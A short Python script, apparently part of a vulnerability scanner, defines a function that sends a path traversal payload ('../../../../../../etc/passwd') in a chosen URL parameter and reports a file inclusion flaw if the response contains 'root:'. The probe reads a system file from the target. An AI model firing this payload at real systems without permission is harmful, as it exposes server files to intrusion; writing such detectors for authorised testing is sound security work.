import requests
from colorama import init, Fore

init(autoreset=True)


def detect_file_inclusion(url, file_param):
    payload = {
        file_param: "../../../../../../etc/passwd"
    }

    try:
        response = requests.get(url, params=payload)

        if "root:" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False



